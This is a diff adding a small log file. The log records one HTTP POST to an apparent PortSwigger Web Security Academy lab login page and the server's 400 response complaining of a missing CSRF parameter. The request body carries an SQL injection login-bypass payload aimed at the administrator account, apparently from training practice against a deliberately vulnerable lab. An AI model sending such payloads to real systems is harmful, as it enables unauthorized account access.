@@ -1,0 +1,11 @@
+# POST https://0a0c00c7034592ad819f349b008a0006.web-security-academy.net/login
+# body: username=administrator%27--&password=x
+
+HTTP 400 Bad Request
+content-type: application/json; charset=utf-8
+x-frame-options: SAMEORIGIN
+connection: close
+content-length: 26
+
+----- RESPONSE BODY (first 5000 chars) -----
+"Missing parameter 'csrf'"
